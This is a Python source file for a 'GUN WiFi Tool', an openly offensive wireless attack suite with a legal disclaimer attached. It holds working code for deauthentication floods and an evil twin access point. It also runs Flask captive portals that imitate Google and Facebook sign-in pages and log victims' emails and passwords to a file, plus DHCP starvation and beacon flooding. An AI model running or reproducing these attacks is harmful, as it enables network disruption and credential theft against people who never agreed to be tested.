#!/usr/bin/env python3
"""
GUN WiFi Tool - Professional WiFi Penetration Testing Suite
Author: GUN Community
License: MIT
Description: Advanced WiFi security testing tool for ethical hackers and security professionals

🔫 Features:
- Advanced Deauthentication Attacks
- Evil Twin Access Points
- Captive Portal Creation (Multi-skin)
- DHCP & Beacon Flooding
- QR Code WiFi Traps
- Real-time Monitoring
- Comprehensive Logging

⚠️  LEGAL DISCLAIMER:
This tool is for authorized penetration testing and educational purposes only.
Users must obtain proper authorization before testing any networks.
Unauthorized access to networks is illegal.
"""

import os
import sys
import signal
import time
import subprocess
import csv
import threading
import json
import logging
import argparse
import random
import string
import re
import hashlib
import hmac
from pathlib import Path
from datetime import datetime
from typing import List, Tuple, Optional, Dict, Any

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Version and info
VERSION = "3.0"
AUTHOR = "GUN Community"
LICENSE = "MIT"

def show_banner():
    """Display professional banner"""
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                        🔫 GUN WiFi Tool v{VERSION}                        ║
║                Professional WiFi Penetration Testing Suite          ║
╠══════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Author:{Colors.RESET} {AUTHOR}                                          {Colors.CYAN}║
║  {Colors.YELLOW}License:{Colors.RESET} {LICENSE}                                                  {Colors.CYAN}║
║  {Colors.YELLOW}Purpose:{Colors.RESET} Authorized Security Testing Only                   {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}⚠️  LEGAL NOTICE:{Colors.RESET}
This tool is intended for authorized penetration testing only.
Ensure you have proper authorization before testing any networks.
Unauthorized access to networks is illegal and unethical.

{Colors.GREEN}🛡️  FEATURES:{Colors.RESET}
• Advanced Deauth Attacks with Precision Targeting
• Evil Twin APs with Multi-skin Captive Portals  
• DHCP Flooding & Beacon Frame Injection
• QR Code WiFi Traps & Device Fingerprinting
• Real-time Monitoring & Comprehensive Logging
• Stealth Mode with MAC Randomization
"""
    print(banner)

# Check Python version
if sys.version_info < (3, 6):
    print(f"{Colors.RED}❌ Python 3.6+ required. Current version: {sys.version}{Colors.RESET}")
    sys.exit(1)

# Enhanced dependency checking
def check_dependencies():
    """Check and import all required dependencies"""
    deps = {}
    missing = []
    
    print(f"{Colors.CYAN}🔍 Checking Dependencies...{Colors.RESET}")
    
    # Check Scapy
    try:
        import scapy.all
        from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
        from scapy.layers.dhcp import DHCP, BOOTP
        from scapy.layers.inet import IP, UDP
        from scapy.layers.l2 import Ether
        deps['scapy'] = True
        print(f"  {Colors.GREEN}✓{Colors.RESET} Scapy")
    except ImportError:
        deps['scapy'] = False
        missing.append("scapy")
        print(f"  {Colors.RED}✗{Colors.RESET} Scapy")
    
    # Check Flask
    try:
        import flask
        from flask import Flask, request, redirect, url_for, render_template_string
        deps['flask'] = True
        print(f"  {Colors.GREEN}✓{Colors.RESET} Flask")
    except ImportError:
        deps['flask'] = False
        missing.append("flask")
        print(f"  {Colors.RED}✗{Colors.RESET} Flask")
    
    # Check QR Code libraries
    try:
        import qrcode
        from PIL import Image, ImageDraw, ImageFont
        deps['qrcode'] = True
        print(f"  {Colors.GREEN}✓{Colors.RESET} QR Code")
    except ImportError:
        deps['qrcode'] = False
        missing.append("qrcode[pil]")
        print(f"  {Colors.RED}✗{Colors.RESET} QR Code")
    
    # Check system tools
    tools = ['airmon-ng', 'airodump-ng', 'hostapd', 'dnsmasq', 'iptables', 'iwconfig']
    for tool in tools:
        try:
            result = subprocess.run(['which', tool], capture_output=True, text=True)
            if result.returncode == 0:
                deps[tool] = True
                print(f"  {Colors.GREEN}✓{Colors.RESET} {tool}")
            else:
                deps[tool] = False
                missing.append(tool)
                print(f"  {Colors.RED}✗{Colors.RESET} {tool}")
        except Exception:
            deps[tool] = False
            missing.append(tool)
            print(f"  {Colors.RED}✗{Colors.RESET} {tool}")
    
    if missing:
        print(f"\n{Colors.RED}❌ Missing Dependencies:{Colors.RESET}")
        for dep in missing:
            print(f"  - {dep}")
        
        print(f"\n{Colors.YELLOW}🔧 Installation Commands:{Colors.RESET}")
        print(f"{Colors.CYAN}# Install Python packages:{Colors.RESET}")
        print(f"pip install scapy flask qrcode[pil] requests pillow")
        print(f"\n{Colors.CYAN}# Install system tools (Ubuntu/Debian):{Colors.RESET}")
        print(f"sudo apt update")
        print(f"sudo apt install aircrack-ng hostapd dnsmasq iptables wireless-tools")
        print(f"\n{Colors.CYAN}# Or use requirements.txt:{Colors.RESET}")
        print(f"pip install -r requirements.txt")
        
        return False
    
    print(f"{Colors.GREEN}✅ All dependencies satisfied{Colors.RESET}")
    return True

# Import dependencies if available
try:
    from scapy.all import sendp, sniff, conf
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    SCAPY_AVAILABLE = True
except ImportError:
    # Create dummy functions if scapy not available
    def sendp(*args, **kwargs):
        print("Scapy not available - packet sending disabled")
        return None
    SCAPY_AVAILABLE = False

try:
    from flask import Flask, request, redirect, url_for, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

class GUNWiFiTool:
    """Professional WiFi Penetration Testing Suite"""
    
    def __init__(self):
        self.interface = None  # Will be auto-detected
        self.mon_interface = None  # Will be auto-set based on detected interface
        self.target_networks = []
        self.captured_data = []
        self.running = False
        
        # Auto-detect WiFi interface
        self.auto_detect_interface()
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('gun_wifi_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def auto_detect_interface(self):
        """Auto-detect available WiFi interface"""
        try:
            print(f"{Colors.CYAN}🔍 Auto-detecting WiFi interface...{Colors.RESET}")
            
            # Method 1: Check iwconfig output
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line or 'no wireless extensions' not in line:
                        interface = line.split()[0]
                        if interface and interface != 'lo' and not interface.endswith(':'):
                            # Verify interface exists and is wireless
                            if self._verify_wireless_interface(interface):
                                self.interface = interface
                                self.mon_interface = f"{interface}mon"
                                print(f"{Colors.GREEN}✅ WiFi interface detected: {self.interface}{Colors.RESET}")
                                return
            
            # Method 2: Check /sys/class/net for wireless interfaces
            net_path = Path("/sys/class/net")
            if net_path.exists():
                for interface_path in net_path.iterdir():
                    interface = interface_path.name
                    wireless_path = interface_path / "wireless"
                    if wireless_path.exists() and interface not in ['lo']:
                        self.interface = interface
                        self.mon_interface = f"{interface}mon"
                        print(f"{Colors.GREEN}✅ WiFi interface detected: {self.interface}{Colors.RESET}")
                        return
            
            # Method 3: Common interface names fallback
            common_interfaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'wlo1', 'wifi0']
            for interface in common_interfaces:
                if self._verify_wireless_interface(interface):
                    self.interface = interface
                    self.mon_interface = f"{interface}mon"
                    print(f"{Colors.YELLOW}⚠️  Using fallback interface: {self.interface}{Colors.RESET}")
                    return
            
            # No interface found
            print(f"{Colors.RED}❌ No WiFi interface detected!{Colors.RESET}")
            print(f"{Colors.YELLOW}💡 Please ensure your WiFi adapter is connected and drivers are installed{Colors.RESET}")
            print(f"{Colors.YELLOW}💡 You can manually specify interface with --interface option{Colors.RESET}")
            sys.exit(1)
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error detecting interface: {e}{Colors.RESET}")
            # Fallback to wlan0
            self.interface = 'wlan0'
            self.mon_interface = 'wlan0mon'
            print(f"{Colors.YELLOW}⚠️  Falling back to default: {self.interface}{Colors.RESET}")
    
    def _verify_wireless_interface(self, interface):
        """Verify if interface is wireless and exists"""
        try:
            # Check if interface exists
            result = subprocess.run(['ip', 'link', 'show', interface], 
                                  capture_output=True, text=True, stderr=subprocess.DEVNULL)
            if result.returncode != 0:
                return False
            
            # Check if it's wireless
            result = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, text=True, stderr=subprocess.DEVNULL)
            return result.returncode == 0 and 'no wireless extensions' not in result.stderr
            
        except Exception:
            return False
    
    def set_interface(self, interface):
        """Manually set interface (override auto-detection)"""
        if self._verify_wireless_interface(interface):
            self.interface = interface
            self.mon_interface = f"{interface}mon"
            print(f"{Colors.GREEN}✅ Interface manually set to: {self.interface}{Colors.RESET}")
            return True
        else:
            print(f"{Colors.RED}❌ Invalid or non-wireless interface: {interface}{Colors.RESET}")
            return False
    
    def _get_network_interface(self):
        """Get best available network interface for attacks"""
        try:
            # First try wireless interface
            if self.interface and self._verify_wireless_interface(self.interface):
                return self.interface
            
            # Check for ethernet interfaces
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'default via' in line:
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part == 'dev' and i + 1 < len(parts):
                                interface = parts[i + 1]
                                print(f"{Colors.YELLOW}🔍 Using default network interface: {interface}{Colors.RESET}")
                                return interface
            
            # Fallback to common names
            common_nets = ['eth0', 'enp0s3', 'ens33', 'ens18']
            for interface in common_nets:
                result = subprocess.run(['ip', 'link', 'show', interface], 
                                      capture_output=True, text=True, stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    print(f"{Colors.YELLOW}⚠️  Using fallback network interface: {interface}{Colors.RESET}")
                    return interface
            
            print(f"{Colors.RED}❌ No suitable network interface found{Colors.RESET}")
            return 'eth0'  # Final fallback
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error detecting network interface: {e}{Colors.RESET}")
            return 'eth0'
    
    def _get_best_channel(self):
        """Auto-select best WiFi channel based on current environment"""
        try:
            print(f"{Colors.CYAN}🔍 Auto-selecting best channel...{Colors.RESET}")
            
            # Try to scan current channels and pick least used
            result = subprocess.run(['iwlist', self.interface, 'scan'], 
                                  capture_output=True, text=True, stderr=subprocess.DEVNULL)
            
            if result.returncode == 0:
                channels = {}
                current_channel = None
                
                for line in result.stdout.split('\n'):
                    if 'Channel:' in line:
                        try:
                            channel = int(line.split('Channel:')[1].strip().split(')')[0])
                            channels[channel] = channels.get(channel, 0) + 1
                        except:
                            continue
                
                if channels:
                    # Pick least used channel from common ones (1, 6, 11)
                    preferred = [1, 6, 11]
                    for ch in preferred:
                        if ch not in channels or channels[ch] == min(channels.values()):
                            print(f"{Colors.GREEN}✅ Selected channel {ch} (least congested){Colors.RESET}")
                            return ch
                    
                    # If all preferred are busy, pick any less used
                    best_channel = min(channels, key=channels.get)
                    print(f"{Colors.YELLOW}⚠️  Selected channel {best_channel} (less congested){Colors.RESET}")
                    return best_channel
            
            # Fallback to channel 6 (most compatible)
            print(f"{Colors.YELLOW}⚠️  Using default channel 6{Colors.RESET}")
            return 6
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error detecting channel: {e}, using default 6{Colors.RESET}")
            return 6
    
    def _signal_handler(self, signum, frame):
        """Handle graceful shutdown"""
        print(f"\n{Colors.YELLOW}🛑 Shutting down gracefully...{Colors.RESET}")
        self.stop_all_attacks()
        sys.exit(0)
    
    def check_root_privileges(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print(f"{Colors.RED}❌ This tool requires root privileges{Colors.RESET}")
            print(f"Run with: {Colors.YELLOW}sudo python3 {sys.argv[0]}{Colors.RESET}")
            return False
        return True
    
    def setup_monitor_mode(self):
        """Setup monitor mode interface"""
        try:
            if not self.interface:
                print(f"{Colors.RED}❌ No WiFi interface available for monitor mode{Colors.RESET}")
                return False
            
            print(f"{Colors.YELLOW}🔧 Setting up monitor mode on {self.interface}...{Colors.RESET}")
            
            # Stop interfering services
            subprocess.run(['systemctl', 'stop', 'NetworkManager'], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Kill conflicting processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                # Update monitor interface name (airmon-ng may change it)
                output = result.stdout
                for line in output.split('\n'):
                    if 'monitor mode enabled' in line or 'enabled on' in line:
                        # Extract actual monitor interface name
                        parts = line.split()
                        for part in parts:
                            if 'mon' in part or self.interface in part:
                                if part != self.interface:
                                    self.mon_interface = part
                                    break
                
                print(f"{Colors.GREEN}✓ Monitor mode enabled on {self.mon_interface}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}❌ Failed to enable monitor mode{Colors.RESET}")
                print(f"Error: {result.stderr}")
                return False
                return False
                
        except Exception as e:
            print(f"{Colors.RED}❌ Monitor mode error: {e}{Colors.RESET}")
            return False
    
    def scan_networks(self, duration=30):
        """Scan for available networks"""
        if not SCAPY_AVAILABLE:
            print(f"{Colors.RED}❌ Scapy required for network scanning{Colors.RESET}")
            return []
        
        print(f"{Colors.CYAN}🔍 Scanning networks for {duration} seconds...{Colors.RESET}")
        
        try:
            # Use airodump-ng for comprehensive scanning
            cmd = [
                'airodump-ng',
                '--write', '/tmp/gun_scan',
                '--write-interval', '1',
                '--output-format', 'csv',
                self.mon_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(duration)
            process.terminate()
            process.wait()
            
            # Parse results
            networks = self._parse_scan_results('/tmp/gun_scan-01.csv')
            print(f"{Colors.GREEN}✓ Found {len(networks)} networks{Colors.RESET}")
            
            return networks
            
        except Exception as e:
            self.logger.error(f"Scan error: {e}")
            return []
    
    def _parse_scan_results(self, csv_file):
        """Parse airodump-ng CSV results"""
        networks = []
        try:
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    content = f.read()
                
                lines = content.split('\n')
                for line in lines[1:]:  # Skip header
                    if line.strip() and ',' in line:
                        parts = line.split(',')
                        if len(parts) >= 14:
                            network = {
                                'bssid': parts[0].strip(),
                                'essid': parts[13].strip(),
                                'channel': parts[3].strip(),
                                'encryption': parts[5].strip(),
                                'power': parts[8].strip()
                            }
                            if network['essid']:
                                networks.append(network)
        except Exception as e:
            self.logger.error(f"Parse error: {e}")
        
        return networks
    
    def deauth_attack(self, target_bssid, client_mac=None, count=50):
        """Perform deauthentication attack"""
        if not SCAPY_AVAILABLE:
            print(f"{Colors.RED}❌ Scapy required for deauth attacks{Colors.RESET}")
            return False
        
        print(f"{Colors.YELLOW}💥 Starting deauth attack...{Colors.RESET}")
        print(f"Target: {target_bssid}")
        
        try:
            for i in range(count):
                if client_mac:
                    # Targeted deauth
                    packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
                else:
                    # Broadcast deauth
                    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
                
                sendp(packet, iface=self.mon_interface, verbose=0)
                
                if i % 10 == 0:
                    print(f"Sent {i+1}/{count} deauth packets")
                
                time.sleep(0.1)
            
            print(f"{Colors.GREEN}✓ Deauth attack completed{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ Deauth attack failed: {e}{Colors.RESET}")
            return False
    
    def create_evil_twin(self, target_ssid, channel=None):
        """Create evil twin access point"""
        # Auto-select best channel if not specified
        if channel is None:
            channel = self._get_best_channel()
        
        print(f"{Colors.YELLOW}👿 Creating evil twin AP...{Colors.RESET}")
        print(f"SSID: {target_ssid}")
        print(f"Channel: {channel}")
        
        try:
            # Create hostapd configuration
            hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=gunwifitest
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
            
            with open('/tmp/hostapd_evil.conf', 'w') as f:
                f.write(hostapd_conf)
            
            # Start hostapd
            cmd = ['hostapd', '/tmp/hostapd_evil.conf']
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Colors.GREEN}✓ Evil twin AP started{Colors.RESET}")
            return process
            
        except Exception as e:
            print(f"{Colors.RED}❌ Evil twin failed: {e}{Colors.RESET}")
            return None
    
    def start_captive_portal(self, skin='google', port=80):
        """Start captive portal server"""
        if not FLASK_AVAILABLE:
            print(f"{Colors.RED}❌ Flask required for captive portal{Colors.RESET}")
            return False
        
        print(f"{Colors.YELLOW}🕷️ Starting captive portal ({skin} skin) on port {port}...{Colors.RESET}")
        
        # Captive portal templates
        templates = {
            'google': '''
            <!DOCTYPE html>
            <html>
            <head><title>Google WiFi</title></head>
            <body style="font-family: Arial; background: #f8f9fa; padding: 50px;">
                <div style="max-width: 400px; margin: auto; background: white; padding: 40px; border-radius: 8px;">
                    <h2 style="color: #1a73e8;">Sign in to WiFi</h2>
                    <form method="POST">
                        <input type="email" name="email" placeholder="Email" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;" required>
                        <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;" required>
                        <button type="submit" style="width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px;">Connect</button>
                    </form>
                </div>
            </body>
            </html>
            ''',
            
            'facebook': '''
            <!DOCTYPE html>
            <html>
            <head><title>Facebook WiFi</title></head>
            <body style="font-family: Arial; background: #f0f2f5; padding: 50px;">
                <div style="max-width: 400px; margin: auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    <h2 style="color: #1877f2; text-align: center;">Connect with Facebook</h2>
                    <form method="POST">
                        <input type="text" name="username" placeholder="Email or Phone" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px;" required>
                        <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px;" required>
                        <button type="submit" style="width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px;">Log In</button>
                    </form>
                </div>
            </body>
            </html>
            '''
        }
        
        try:
            app = Flask(__name__)
            
            @app.route('/')
            @app.route('/<path:path>')
            def captive_page(path=''):
                return templates.get(skin, templates['google'])
            
            @app.route('/', methods=['POST'])
            def capture_creds():
                username = request.form.get('username') or request.form.get('email', '')
                password = request.form.get('password', '')
                
                if username and password:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    with open('captured_credentials.log', 'a') as f:
                        f.write(f"{timestamp} | {username} | {password}\n")
                    
                    print(f"{Colors.GREEN}🎯 Captured: {username} : {password}{Colors.RESET}")
                
                return redirect('https://www.google.com')
            
            # Start Flask in background
            threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False), daemon=True).start()
            
            print(f"{Colors.GREEN}✓ Captive portal started on port {port}{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ Captive portal failed: {e}{Colors.RESET}")
            return False
    
    def dhcp_flood(self, interface=None, count=100):
        """Perform DHCP flooding attack"""
        if not SCAPY_AVAILABLE:
            print(f"{Colors.RED}❌ Scapy required for DHCP flooding{Colors.RESET}")
            return False
        
        # Auto-detect network interface if not provided
        if not interface:
            interface = self._get_network_interface()
        
        print(f"{Colors.YELLOW}🌊 Starting DHCP flood attack on {interface}...{Colors.RESET}")
        
        try:
            for i in range(count):
                # Generate random MAC
                mac = ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(6)])
                
                # Create DHCP discover packet
                packet = Ether(src=mac) / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(packet, iface=interface, verbose=0)
                
                if i % 10 == 0:
                    print(f"Sent {i+1}/{count} DHCP requests")
                
                time.sleep(0.1)
            
            print(f"{Colors.GREEN}✓ DHCP flood completed{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ DHCP flood failed: {e}{Colors.RESET}")
            return False
    
    def beacon_flood(self, count=50):
        """Perform beacon flooding attack"""
        if not SCAPY_AVAILABLE:
            print(f"{Colors.RED}❌ Scapy required for beacon flooding{Colors.RESET}")
            return False
        
        print(f"{Colors.YELLOW}📡 Starting beacon flood attack...{Colors.RESET}")
        
        try:
            for i in range(count):
                # Generate random SSID and MAC
                ssid = f"FakeAP_{random.randint(1000, 9999)}"
                mac = ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(6)])
                
                # Create beacon frame
                packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon(cap='ESS') / Dot11Elt(ID='SSID', info=ssid)
                
                sendp(packet, iface=self.mon_interface, verbose=0)
                
                if i % 10 == 0:
                    print(f"Sent {i+1}/{count} beacon frames")
                
                time.sleep(0.1)
            
            print(f"{Colors.GREEN}✓ Beacon flood completed{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ Beacon flood failed: {e}{Colors.RESET}")
            return False
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        print(f"{Colors.YELLOW}🛑 Stopping all attacks...{Colors.RESET}")
        
        try:
            # Kill hostapd processes
            subprocess.run(['pkill', '-f', 'hostapd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Disable monitor mode
            subprocess.run(['airmon-ng', 'stop', self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Restart NetworkManager
            subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"{Colors.GREEN}✓ All attacks stopped{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}❌ Cleanup error: {e}{Colors.RESET}")
    
    def show_menu(self):
        """Show interactive menu"""
        while True:
            print(f"\n{Colors.CYAN}🎯 GUN WiFi Tool - Main Menu{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*40}{Colors.RESET}")
            print(f"{Colors.YELLOW}1.{Colors.RESET} Setup Monitor Mode")
            print(f"{Colors.YELLOW}2.{Colors.RESET} Scan Networks")
            print(f"{Colors.YELLOW}3.{Colors.RESET} Deauth Attack")
            print(f"{Colors.YELLOW}4.{Colors.RESET} Evil Twin AP")
            print(f"{Colors.YELLOW}5.{Colors.RESET} Captive Portal")
            print(f"{Colors.YELLOW}6.{Colors.RESET} DHCP Flood")
            print(f"{Colors.YELLOW}7.{Colors.RESET} Beacon Flood")
            print(f"{Colors.YELLOW}8.{Colors.RESET} View Captured Data")
            print(f"{Colors.YELLOW}0.{Colors.RESET} Exit")
            
            try:
                choice = input(f"\n{Colors.CYAN}Select option: {Colors.RESET}").strip()
                
                if choice == '1':
                    self.setup_monitor_mode()
                elif choice == '2':
                    networks = self.scan_networks()
                    for i, net in enumerate(networks[:10], 1):
                        print(f"{i}. {net['essid']} ({net['bssid']}) - {net['encryption']}")
                elif choice == '3':
                    bssid = input("Enter target BSSID: ").strip()
                    if bssid:
                        self.deauth_attack(bssid)
                elif choice == '4':
                    ssid = input("Enter SSID for evil twin: ").strip()
                    if ssid:
                        self.create_evil_twin(ssid)
                elif choice == '5':
                    skin = input("Enter skin (google/facebook): ").strip() or 'google'
                    self.start_captive_portal(skin)
                elif choice == '6':
                    interface = input(f"Enter interface (or press Enter for auto-detect): ").strip()
                    if not interface:
                        interface = None  # Will auto-detect
                    self.dhcp_flood(interface)
                elif choice == '7':
                    self.beacon_flood()
                elif choice == '8':
                    self.show_captured_data()
                elif choice == '0':
                    self.stop_all_attacks()
                    break
                else:
                    print(f"{Colors.RED}❌ Invalid option{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
                self.stop_all_attacks()
                break
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
    
    def show_captured_data(self):
        """Show captured credentials"""
        try:
            if os.path.exists('captured_credentials.log'):
                print(f"\n{Colors.CYAN}🎯 Captured Credentials:{Colors.RESET}")
                with open('captured_credentials.log', 'r') as f:
                    print(f.read())
            else:
                print(f"{Colors.YELLOW}No credentials captured yet{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}❌ Error reading data: {e}{Colors.RESET}")

def main():
    """Main function"""
    show_banner()
    
    # Check dependencies
    if not check_dependencies():
        print(f"\n{Colors.RED}❌ Missing dependencies. Please install required packages.{Colors.RESET}")
        sys.exit(1)
    
    # Initialize tool
    tool = GUNWiFiTool()
    
    # Check root privileges
    if not tool.check_root_privileges():
        sys.exit(1)
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="GUN WiFi Tool - Professional WiFi Penetration Testing Suite")
    parser.add_argument('--scan', action='store_true', help='Scan for networks')
    parser.add_argument('--deauth', action='store_true', help='Perform deauth attack')
    parser.add_argument('--target', help='Target BSSID for attacks')
    parser.add_argument('--evil-twin', action='store_true', help='Create evil twin AP')
    parser.add_argument('--ssid', help='SSID for evil twin')
    parser.add_argument('--captive-portal', action='store_true', help='Start captive portal')
    parser.add_argument('--captive-skin', choices=['google', 'facebook'], default='google', help='Captive portal skin')
    parser.add_argument('--dhcp-flood', action='store_true', help='Perform DHCP flood')
    parser.add_argument('--beacon-flood', action='store_true', help='Perform beacon flood')
    parser.add_argument('--interface', help='Interface to use (auto-detected if not specified)')
    parser.add_argument('--monitor', action='store_true', help='Setup monitor mode')
    parser.add_argument('--interactive', action='store_true', help='Start interactive menu')
    
    args = parser.parse_args()
    
    # Set interface manually if provided, otherwise use auto-detected
    if args.interface:
        if not tool.set_interface(args.interface):
            print(f"{Colors.RED}❌ Failed to set interface. Using auto-detected interface.{Colors.RESET}")
    
    try:
        # Execute based on arguments
        if args.monitor:
            tool.setup_monitor_mode()
        elif args.scan:
            networks = tool.scan_networks()
            print(f"\n{Colors.CYAN}📡 Found Networks:{Colors.RESET}")
            for i, net in enumerate(networks, 1):
                print(f"{i}. {net['essid']} ({net['bssid']}) - {net['encryption']}")
        elif args.deauth and args.target:
            tool.deauth_attack(args.target)
        elif args.evil_twin and args.ssid:
            tool.create_evil_twin(args.ssid)
        elif args.captive_portal:
            tool.start_captive_portal(args.captive_skin)
        elif args.dhcp_flood:
            tool.dhcp_flood(args.interface)
        elif args.beacon_flood:
            tool.beacon_flood()
        elif args.interactive or len(sys.argv) == 1:
            tool.show_menu()
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
    finally:
        tool.stop_all_attacks()

if __name__ == "__main__":
    main()
